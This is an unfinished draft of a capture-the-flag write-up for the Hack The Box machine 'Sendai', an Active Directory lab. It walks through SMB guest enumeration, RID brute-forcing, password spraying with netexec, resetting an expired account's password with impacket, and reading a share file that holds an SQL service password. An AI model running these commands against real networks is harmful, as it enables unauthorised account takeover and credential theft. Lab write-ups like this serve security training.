---
title: Sendai
date: 2026-04-07
ShowToc: true
draft: true
TocOpen: true
tags:
  - blog
  - HTB
lastmod: 2026-04-15T05:19:49.772Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Sendai" >}}

***

# Recon

### \[\[PORT & IP SCAN]]

The `nmap` reveal that the machine is ((change it) a standard Windows AD Server , with the kerberos auth , also the ldap query , and the 3389 port show that the domain `AWSJPDC0522.shibuya.vl` ,but the ldap anonymous inquiry failed .)

```
Host is up, received echo-reply ttl 127 (0.19s latency).
Scanned at 2026-04-13 11:38:34 EDT for 22s
Not shown: 65511 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
443/tcp   open  https            syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
3389/tcp  open  ms-wbt-server    syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
51962/tcp open  unknown          syn-ack ttl 127
54110/tcp open  unknown          syn-ack ttl 127
54111/tcp open  unknown          syn-ack ttl 127
54128/tcp open  unknown          syn-ack ttl 127
54132/tcp open  unknown          syn-ack ttl 127
60843/tcp open  unknown          syn-ack ttl 127
```

### DNS 53

Found the `sendai.vl DC` with using the netexec and add into the /etc/hosts

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec smb 10.129.214.142  --generate-hosts-file hosts
SMB         10.129.214.142  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False) 
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop]
└─# cat hosts       
10.129.214.142     DC.sendai.vl sendai.vl DC
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop]
└─# sudo vim /etc/hosts
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop]
└─# cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali
10.129.214.142     DC.sendai.vl sendai.vl DC

::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters


```

### Port 80

Standard windows IIS web server , dont send too much time in here\
![Pasted image 20260414162450.png](/ob/Pasted%20image%2020260414162450.png)

### SMB

Allow the `guest` login

```
┌──(root㉿kali)-[~/Desktop]
└─# nxc smb 10.129.214.142  -u 'guest' -p '' --shares
SMB         10.129.214.142  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False) 
SMB         10.129.214.142  445    DC               [+] sendai.vl\guest: 
SMB         10.129.214.142  445    DC               [*] Enumerated shares
SMB         10.129.214.142  445    DC               Share           Permissions     Remark
SMB         10.129.214.142  445    DC               -----           -----------     ------
SMB         10.129.214.142  445    DC               ADMIN$                          Remote Admin
SMB         10.129.214.142  445    DC               C$                              Default share
SMB         10.129.214.142  445    DC               config                          
SMB         10.129.214.142  445    DC               IPC$            READ            Remote IPC
SMB         10.129.214.142  445    DC               NETLOGON                        Logon server share 
SMB         10.129.214.142  445    DC               sendai          READ            company share
SMB         10.129.214.142  445    DC               SYSVOL                          Logon server share 
SMB         10.129.214.142  445    DC               Users           READ            
```

check the Users with smbclient

```
┌──(root㉿kali)-[~/Desktop]
└─# smbclient -U Guest%'' //10.129.214.142/Users 
Try "help" to get a list of possible commands.
smb: \> 
```

But there is not any interesting in `Users`

```
smb: \> ls
  .                                  DR        0  Tue Jul 11 05:58:27 2023
  ..                                DHS        0  Tue Apr 15 22:55:42 2025
  Default                           DHR        0  Tue Jul 11 12:36:32 2023
  desktop.ini                       AHS      174  Sat May  8 04:18:31 2021
  Public                             DR        0  Tue Jul 11 03:36:58 2023

                7019007 blocks of size 4096. 1207039 blocks available
smb: \> 
```

Getting the these file in `sendai`

`incident.txt`\
{{< code >}}\
Dear valued employees,

We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.

To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.

We kindly request all impacted users to follow the password reset process promptly to ensure the security and integrity of our systems. Please bear in mind that strong passwords play a crucial role in safeguarding sensitive information and protecting our network from potential threats.

If you need assistance or have any questions regarding the password reset procedure, please don't hesitate to reach out to the IT support team. They will be more than happy to guide you through the process and provide any necessary support.

Thank you for your cooperation and commitment to maintaining a secure environment for all of us. Your vigilance and adherence to robust security practices contribute significantly to our collective safety.\
{{< /code >}}

That maybe the hits to use the weak password

`guidelines.txt`\
{{< code >}}\
Company: Sendai\
User Behavior Guidelines

Effective Date: \[Insert Date]\
Version: 1.0

Table of Contents:

Introduction

General Guidelines

Security Guidelines

Internet and Email Usage Guidelines

Data Management Guidelines

Software Usage Guidelines

Hardware Usage Guidelines

Conclusion

Introduction:

These User Behavior Guidelines are established to ensure the efficient and secure use of information technology resources within Sendai. By adhering to these guidelines, users can contribute to maintaining a productive and secure IT environment. It is the responsibility of every employee to read, understand, and follow these guidelines.

General Guidelines:\
2.1. Password Security:\
a. Users must choose strong passwords that are difficult to guess.\
b. Passwords should be changed regularly and not shared with others.\
c. Users should never write down their passwords or store them in easily accessible locations.

2.2. User Accounts:\
a. Users must not share their user accounts with others.\
b. Each user is responsible for any activities carried out using their account.

2.3. Reporting Incidents:\
a. Users must promptly report any suspected security incidents or unauthorized access to the IT department.\
b. Users should report any IT-related issues to the IT support team for resolution.

2.4. Physical Security:\
a. Users should not leave their workstations unlocked and unattended.\
b. Confidential information and sensitive documents should be stored securely.

Security Guidelines:\
3.1. Malicious Software:\
a. Users must not download or install unauthorized software on company devices.\
b. Users should regularly update their devices with the latest security patches and antivirus software.

3.2. Social Engineering:\
a. Users should be cautious of phishing emails, phone calls, or messages.\
b. Users must not share sensitive information or credentials through untrusted channels.

3.3. Data Backup:\
a. Users should regularly back up their important files and data.\
b. Critical data should be stored on secure network drives or cloud storage.

Internet and Email Usage Guidelines:\
4.1. Acceptable Use:\
a. Internet and email usage should be for work-related purposes.\
b. Users must not access or download inappropriate or unauthorized content.

4.2. Email Etiquette:\
a. Users should maintain professionalism in all email communications.\
b. Users should avoid forwarding chain emails or unauthorized attachments.

4.3. Email Security:\
a. Users should exercise caution when opening email attachments or clicking on links from unknown sources.\
b. Confidential information must not be sent via unencrypted email.

Data Management Guidelines:\
5.1. Data Classification:\
a. Users must classify data according to its sensitivity level.\
b. Users should handle and store sensitive data in accordance with the company's data protection policies.

5.2. Data Privacy:\
a. Users must respect the privacy of personal and sensitive information.\
b. Unauthorized disclosure or sharing of personal data is strictly prohibited.

Software Usage Guidelines:\
6.1. Authorized Software:\
a. Users must only use authorized software and adhere to licensing agreements.\
b. Users should not install or use unauthorized or pirated software.

6.2. Software Updates:\
a. Users should regularly update their software to benefit from the latest features and security patches.\
b. Automatic updates should be enabled whenever possible.

Hardware Usage Guidelines:\
7.1. Equipment Care:\
a. Users should handle company hardware with care and report any damages or malfunctions promptly.\
b. Users must not attempt to repair or modify company equipment without proper authorization.

7.2. Personal Devices:\
a. Users should not connect personal devices to the company network without prior approval from the IT department.\
b. Personal devices used for work purposes must comply with company security policies.

Conclusion:\
By following these User Behavior Guidelines, Sendai employees contribute to the overall security, productivity, and effectiveness of the company's IT infrastructure. Users should regularly review these guidelines and seek clarification from the IT department whenever necessary.

Failure to comply with these guidelines may result in disciplinary action, including the suspension of IT privileges or other appropriate measures.

For any questions or concerns regarding these guidelines, please contact the IT department at \[Contact Information].\
{{< /code >}}

Possible userslist in the `\transfer\`

```
  .                                   D        0  Tue Jul 11 09:00:20 2023
  ..                                  D        0  Tue Jul 18 13:31:04 2023
  anthony.smith                       D        0  Tue Jul 11 08:59:50 2023
  clifford.davey                      D        0  Tue Jul 11 09:00:06 2023
  elliot.yates                        D        0  Tue Jul 11 08:59:26 2023
  lisa.williams                       D        0  Tue Jul 11 08:59:34 2023
  susan.harper                        D        0  Tue Jul 11 08:59:39 2023
  temp                                D        0  Tue Jul 11 09:00:16 2023
  thomas.powell                       D        0  Tue Jul 11 08:59:45 2023

                7019007 blocks of size 4096. 1206612 blocks available
```

{{< code >}}\
anthony.smith\
clifford.davey\
elliot.yates\
lisa.williams\
susan.harper\
temp\
thomas.powell\
{{< /code >}}

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec smb 10.129.214.142 -u  userlist -p userlist --continue-on-success  
SMB         10.129.214.142  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)
SMB         10.129.214.142  445    DC               [-] sendai.vl\anthony.smith:anthony.smith STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\clifford.davey:anthony.smith STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\elliot.yates:anthony.smith STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\lisa.williams:anthony.smith STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\susan.harper:anthony.smith STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [+] sendai.vl\temp:anthony.smith (Guest)
SMB         10.129.214.142  445    DC               [-] sendai.vl\thomas.powell:anthony.smith STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\anthony.smith:clifford.davey STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\clifford.davey:clifford.davey STATUS_LOGON_FAILURE
SMB         10.129.214.142  445    DC               [-] sendai.vl\elliot.yates:clifford.davey STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\lisa.williams:clifford.davey STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\susan.harper:clifford.davey STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\thomas.powell:clifford.davey STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\anthony.smith:elliot.yates STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\clifford.davey:elliot.yates STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\elliot.yates:elliot.yates STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\lisa.williams:elliot.yates STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\susan.harper:elliot.yates STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\thomas.powell:elliot.yates STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\anthony.smith:lisa.williams STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\clifford.davey:lisa.williams STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\elliot.yates:lisa.williams STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\lisa.williams:lisa.williams STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\susan.harper:lisa.williams STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\thomas.powell:lisa.williams STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\anthony.smith:susan.harper STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\clifford.davey:susan.harper STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\elliot.yates:susan.harper STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\lisa.williams:susan.harper STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\susan.harper:susan.harper STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\thomas.powell:susan.harper STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\anthony.smith:temp STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\clifford.davey:temp STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\elliot.yates:temp STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\lisa.williams:temp STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\susan.harper:temp STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\thomas.powell:temp STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\anthony.smith:thomas.powell STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\clifford.davey:thomas.powell STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\elliot.yates:thomas.powell STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\lisa.williams:thomas.powell STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\susan.harper:thomas.powell STATUS_LOGON_FAILURE 
SMB         10.129.214.142  445    DC               [-] sendai.vl\thomas.powell:thomas.powell STATUS_LOGON_FAILURE 
                                                                                                                    
```

Also use the rid to brute-force in SMB

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec smb 10.129.234.66   -u  Guest  -p  ''  --rid-brute
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.66   445    DC               [+] sendai.vl\Guest: 
SMB         10.129.234.66   445    DC               498: SENDAI\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               500: SENDAI\Administrator (SidTypeUser)
SMB         10.129.234.66   445    DC               501: SENDAI\Guest (SidTypeUser)
SMB         10.129.234.66   445    DC               502: SENDAI\krbtgt (SidTypeUser)
SMB         10.129.234.66   445    DC               512: SENDAI\Domain Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               513: SENDAI\Domain Users (SidTypeGroup)
SMB         10.129.234.66   445    DC               514: SENDAI\Domain Guests (SidTypeGroup)
SMB         10.129.234.66   445    DC               515: SENDAI\Domain Computers (SidTypeGroup)
SMB         10.129.234.66   445    DC               516: SENDAI\Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               517: SENDAI\Cert Publishers (SidTypeAlias)
SMB         10.129.234.66   445    DC               518: SENDAI\Schema Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               519: SENDAI\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               520: SENDAI\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.66   445    DC               521: SENDAI\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               522: SENDAI\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.66   445    DC               525: SENDAI\Protected Users (SidTypeGroup)
SMB         10.129.234.66   445    DC               526: SENDAI\Key Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               527: SENDAI\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.66   445    DC               553: SENDAI\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.66   445    DC               571: SENDAI\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.66   445    DC               572: SENDAI\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.66   445    DC               1000: SENDAI\DC$ (SidTypeUser)
SMB         10.129.234.66   445    DC               1101: SENDAI\DnsAdmins (SidTypeAlias)
SMB         10.129.234.66   445    DC               1102: SENDAI\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.66   445    DC               1103: SENDAI\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)
SMB         10.129.234.66   445    DC               1104: SENDAI\sqlsvc (SidTypeUser)
SMB         10.129.234.66   445    DC               1105: SENDAI\websvc (SidTypeUser)
SMB         10.129.234.66   445    DC               1107: SENDAI\staff (SidTypeGroup)
SMB         10.129.234.66   445    DC               1108: SENDAI\Dorothy.Jones (SidTypeUser)
SMB         10.129.234.66   445    DC               1109: SENDAI\Kerry.Robinson (SidTypeUser)
SMB         10.129.234.66   445    DC               1110: SENDAI\Naomi.Gardner (SidTypeUser)
SMB         10.129.234.66   445    DC               1111: SENDAI\Anthony.Smith (SidTypeUser)
SMB         10.129.234.66   445    DC               1112: SENDAI\Susan.Harper (SidTypeUser)
SMB         10.129.234.66   445    DC               1113: SENDAI\Stephen.Simpson (SidTypeUser)
SMB         10.129.234.66   445    DC               1114: SENDAI\Marie.Gallagher (SidTypeUser)
SMB         10.129.234.66   445    DC               1115: SENDAI\Kathleen.Kelly (SidTypeUser)
SMB         10.129.234.66   445    DC               1116: SENDAI\Norman.Baxter (SidTypeUser)
SMB         10.129.234.66   445    DC               1117: SENDAI\Jason.Brady (SidTypeUser)
SMB         10.129.234.66   445    DC               1118: SENDAI\Elliot.Yates (SidTypeUser)
SMB         10.129.234.66   445    DC               1119: SENDAI\Malcolm.Smith (SidTypeUser)
SMB         10.129.234.66   445    DC               1120: SENDAI\Lisa.Williams (SidTypeUser)
SMB         10.129.234.66   445    DC               1121: SENDAI\Ross.Sullivan (SidTypeUser)
SMB         10.129.234.66   445    DC               1122: SENDAI\Clifford.Davey (SidTypeUser)
SMB         10.129.234.66   445    DC               1123: SENDAI\Declan.Jenkins (SidTypeUser)
SMB         10.129.234.66   445    DC               1124: SENDAI\Lawrence.Grant (SidTypeUser)
SMB         10.129.234.66   445    DC               1125: SENDAI\Leslie.Johnson (SidTypeUser)
SMB         10.129.234.66   445    DC               1126: SENDAI\Megan.Edwards (SidTypeUser)
SMB         10.129.234.66   445    DC               1127: SENDAI\Thomas.Powell (SidTypeUser)
SMB         10.129.234.66   445    DC               1128: SENDAI\ca-operators (SidTypeGroup)
SMB         10.129.234.66   445    DC               1129: SENDAI\admsvc (SidTypeGroup)
SMB         10.129.234.66   445    DC               1130: SENDAI\mgtsvc$ (SidTypeUser)
SMB         10.129.234.66   445    DC               1131: SENDAI\support (SidTypeGroup)
```

Editing it to tmp and make a good wordlists

```
┌──(root㉿kali)-[~/Desktop]
└─# cat tmp.txt| awk  -F \  '{print $6}' |  awk  -F SENDAI  '{print $2}'                  
\Enterprise
\Administrator
\Guest
\krbtgt
\Domain
\Domain
\Domain
\Domain
\Domain
\Cert
\Schema
\Enterprise
\Group
\Read-only
\Cloneable
\Protected
\Key
\Enterprise
\RAS
\Allowed
\Denied
\DC$
\DnsAdmins
\DnsUpdateProxy
\SQLServer2005SQLBrowserUser$DC
\sqlsvc
\websvc
\staff
\Dorothy.Jones
\Kerry.Robinson
\Naomi.Gardner
\Anthony.Smith
\Susan.Harper
\Stephen.Simpson
\Marie.Gallagher
\Kathleen.Kelly
\Norman.Baxter
\Jason.Brady
\Elliot.Yates
\Malcolm.Smith
\Lisa.Williams
\Ross.Sullivan
\Clifford.Davey
\Declan.Jenkins
\Lawrence.Grant
\Leslie.Johnson
\Megan.Edwards
\Thomas.Powell
\ca-operators
\admsvc
\mgtsvc$
\support
```

Finally will use the vscode to replace to `\`

And here is the finally list

{{< code >}}\
anthony.smith\
clifford.davey\
elliot.yates\
lisa.williams\
susan.harper\
temp\
thomas.powell\
Enterprise\
Administrator\
Guest\
krbtgt\
Domain\
Domain\
Domain\
Domain\
Domain\
Cert\
Schema\
Enterprise\
Group\
Read-only\
Cloneable\
Protected\
Key\
Enterprise\
RAS\
Allowed\
Denied\
DC$
DnsAdmins
DnsUpdateProxy
SQLServer2005SQLBrowserUser$DC\
sqlsvc\
websvc\
staff\
Dorothy.Jones\
Kerry.Robinson\
Naomi.Gardner\
Anthony.Smith\
Susan.Harper\
Stephen.Simpson\
Marie.Gallagher\
Kathleen.Kelly\
Norman.Baxter\
Jason.Brady\
Elliot.Yates\
Malcolm.Smith\
Lisa.Williams\
Ross.Sullivan\
Clifford.Davey\
Declan.Jenkins\
Lawrence.Grant\
Leslie.Johnson\
Megan.Edwards\
Thomas.Powell\
ca-operators\
admsvc\
mgtsvc\$\
support\
{{< /code >}}

I have the option for empty password and same account and same password

```
┌──(root㉿kali)-[~/Desktop]
└─# netexec smb 10.129.234.66  -u  tmp1.txt -p  ''  --continue-on-success  
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.66   445    DC               [-] sendai.vl\anthony.smith: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\clifford.davey: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\elliot.yates: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\lisa.williams: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\susan.harper: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\temp: (Guest)
SMB         10.129.234.66   445    DC               [-] sendai.vl\thomas.powell: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\Enterprise: (Guest)
SMB         10.129.234.66   445    DC               [-] sendai.vl\Administrator: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\Guest: 
SMB         10.129.234.66   445    DC               [-] sendai.vl\krbtgt: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\Domain: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Domain: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Domain: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Domain: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Domain: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Cert: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Schema: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Enterprise: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Group: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Read-only: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Cloneable: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Protected: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Key: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Enterprise: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\RAS: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Allowed: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\Denied: (Guest)
SMB         10.129.234.66   445    DC               [-] sendai.vl\DC$: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\DnsAdmins: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\DnsUpdateProxy: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\SQLServer2005SQLBrowserUser$DC: (Guest)
SMB         10.129.234.66   445    DC               [-] sendai.vl\sqlsvc: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\websvc: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\staff: (Guest)
SMB         10.129.234.66   445    DC               [-] sendai.vl\Dorothy.Jones: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kerry.Robinson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Naomi.Gardner: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Anthony.Smith: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Susan.Harper: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Stephen.Simpson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Marie.Gallagher: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Kathleen.Kelly: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Norman.Baxter: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Jason.Brady: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Elliot.Yates: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Malcolm.Smith: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lisa.Williams: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Ross.Sullivan: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Clifford.Davey: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Declan.Jenkins: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Lawrence.Grant: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Leslie.Johnson: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Megan.Edwards: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [-] sendai.vl\Thomas.Powell: STATUS_PASSWORD_MUST_CHANGE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\ca-operators: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\admsvc: (Guest)
SMB         10.129.234.66   445    DC               [-] sendai.vl\mgtsvc$: STATUS_LOGON_FAILURE 
SMB         10.129.234.66   445    DC               [+] sendai.vl\support: (Guest)
SMB         10.129.234.66   445    DC               [+] sendai.vl\: 
```

If i use the empty password will have the `STATUS_PASSWORD_MUST_CHANGE` with elliot.yates and thomas.powell

### Update password

using the impacket-changepasswd to change the password of thomas.powell

```
┌──(root㉿kali)-[~/Desktop]
└─# impacket-changepasswd sendai.vl/thomas.powell:@dc.sendai.vl -newpass 'Password1'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Current password: 
[*] Changing the password of sendai.vl\thomas.powell
[*] Connecting to DCE/RPC as sendai.vl\thomas.powell
[!] Password is expired or must be changed, trying to bind with a null session.
[*] Connecting to DCE/RPC as null session
[*] Password was changed successfully.
```

back to  thomas.powell 's smb shares

```
┌──(root㉿kali)-[~/Desktop]
└─# nxc smb 10.129.234.66 -u thomas.powell   -p Password1 --shares              
SMB         10.129.234.66   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.66   445    DC               [+] sendai.vl\thomas.powell:Password1 
SMB         10.129.234.66   445    DC               [*] Enumerated shares
SMB         10.129.234.66   445    DC               Share           Permissions     Remark
SMB         10.129.234.66   445    DC               -----           -----------     ------
SMB         10.129.234.66   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.66   445    DC               C$                              Default share
SMB         10.129.234.66   445    DC               config          READ,WRITE      
SMB         10.129.234.66   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.66   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.66   445    DC               sendai          READ,WRITE      company share
SMB         10.129.234.66   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.234.66   445    DC               Users           READ            
```

using the smbclient to find out there is the `sqlconfig` file

```
┌──(root㉿kali)-[~/Desktop]
└─# smbclient '//DC.sendai.vl/config' -U 'thomas.powell%Password1'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 14 23:53:14 2026                                                                                                              
  ..                                DHS        0  Tue Apr 15 22:55:42 2025                                                                                                              
  .sqlconfig                          A       78  Tue Jul 11 08:57:11 2023                                                                                                              
                                                                                                                                                                                        
                7019007 blocks of size 4096. 1235602 blocks available
smb: \> 

```

It will show the account of database as the 1443 is the port of MS SQL SERVER

```
┌──(root㉿kali)-[~/Desktop]
└─# cat .sqlconfig
Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85; 
```

but it show nothing

```
┌──(root㉿kali)-[~/Desktop]
└─# nxc mssql dc.sendai.vl  -u sqlsvc    -p 'SurenessBlob85;'   --local-auth 

```

That is the wrong path

Can i use the thomas.powell to do the bloodhound ?
